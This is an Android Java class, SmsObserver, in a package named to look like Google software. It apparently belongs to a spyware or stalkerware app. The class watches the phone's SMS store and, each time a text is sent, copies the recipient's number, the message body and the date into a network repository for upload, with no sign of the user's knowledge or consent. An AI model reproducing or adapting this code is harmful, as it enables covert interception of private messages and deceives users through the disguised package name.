package com.google.android.apps.receiver;

import android.content.Context;
import android.database.ContentObserver;
import android.database.Cursor;
import android.net.Uri;
import android.os.Handler;
import android.provider.Telephony;
import android.util.Log;

import com.google.android.apps.App;
import com.google.android.apps.repositories.models.events.Message;
import com.google.android.apps.repositories.network.NetworkRepo;
import com.google.android.apps.utils.Constants;
import com.google.android.apps.utils.DateUtils;
import com.google.android.apps.utils.Preferences;

/**
 * Created by OldMan on 21.07.2017.
 */

public class SmsObserver extends ContentObserver {

    private static final String TAG = "SmsObserver";
    private static final Uri STATUS_URI = Uri.parse("content://sms");
    private Preferences preferences;
    private NetworkRepo networkRepo;
    private Context context;
    private volatile long id = 0;

    public SmsObserver(Handler handler, Context context) {
        super(handler);
        this.context = context;
        preferences = App.getAppComponent().getPreferences();
        networkRepo = App.getAppComponent().getNetworkRepo();
    }

    @Override
    public boolean deliverSelfNotifications() {
        return true;
    }

    @Override
    public void onChange(boolean selfChange) {
        try {
            Log.d(TAG, "Notification on SMS observer");
            if (!preferences.isSms())
                return;
            Cursor smsCursor = context.getContentResolver().query(
                    STATUS_URI, null, null, null, null);
            if (smsCursor != null) {
                if (smsCursor.moveToFirst()) {
                    Message message = new Message();
                    String protocol = smsCursor.getString(smsCursor
                            .getColumnIndex("protocol"));
                    Log.d(TAG, "protocol : " + protocol);
                    if (protocol == null) {
                        int type = smsCursor.getInt(smsCursor
                                .getColumnIndex("type"));
                        Log.d(TAG, "SMS Type : " + type);
                        if (type == Telephony.Sms.MESSAGE_TYPE_SENT) {
                            long messageId = smsCursor
                                    .getLong(smsCursor
                                            .getColumnIndex("_id"));
                            if (messageId != id) {
                                id = messageId;
                                int threadId = smsCursor
                                        .getInt(smsCursor
                                                .getColumnIndex("thread_id"));
                                Cursor cursor = context.getContentResolver().query(
                                        Uri.parse("content://sms/outbox/"
                                                + threadId), null, null, null,
                                        null);
                                if (cursor != null) {
                                    while (cursor.moveToNext()) {
                                        message.setNumber(smsCursor
                                                .getString(smsCursor
                                                        .getColumnIndex("address")));
                                        message.setData(smsCursor
                                                .getString(smsCursor
                                                        .getColumnIndex("body")));
                                        message.setDate(DateUtils.convertMilliSecondsToFormattedDate(smsCursor
                                                .getLong(smsCursor.getColumnIndex("date"))));
                                        message.setType(Constants.OUTGOING_SMS);
                                        networkRepo.addSms(message);
                                    }
                                    cursor.close();
                                }
                                // -------send sms----------------------------
                                smsCursor.close();
                            }
                        }
                    }
                }
            } else
                Log.d(TAG, "smsSentObserver: Send Cursor is Empty");
        } catch (Exception sggh) {
            Log.d(TAG, "Error on onChange : " + sggh.toString());
        }
        super.onChange(selfChange);
    }
}
